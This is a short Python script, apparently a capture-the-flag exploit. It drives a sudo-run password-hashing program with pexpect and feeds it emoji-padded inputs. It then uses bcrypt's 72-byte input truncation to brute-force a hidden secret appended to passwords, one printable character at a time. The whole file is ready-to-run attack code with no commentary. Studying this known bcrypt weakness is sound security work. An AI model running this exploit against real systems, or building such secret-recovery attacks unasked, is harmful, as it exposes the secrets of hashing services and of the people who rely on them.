##
##

import bcrypt
import pexpect
import string

padd = 17
secret = ''
while padd > 0:
  p = 3
  while p >= 0:
    pad = ('A'*p).encode()
    child = pexpect.spawn('sudo /opt/hash_system/hash_password.py')
    child.expect('Enter Password> ')
    child.sendline(('🖕'*padd).encode()+pad)
    child.expect('Hash: ')
    child.expect(pexpect.EOF)
    salt = child.before.strip()
    chars = string.printable
    for x in chars:
      f = secret+x
      pw = bcrypt.hashpw(('🖕'*padd).encode()+pad+f.encode(),salt)
      if salt == pw:
        secret=f
        print(f'Secret: {secret}')
        break
    p -= 1
  padd -= 1
  
##
##
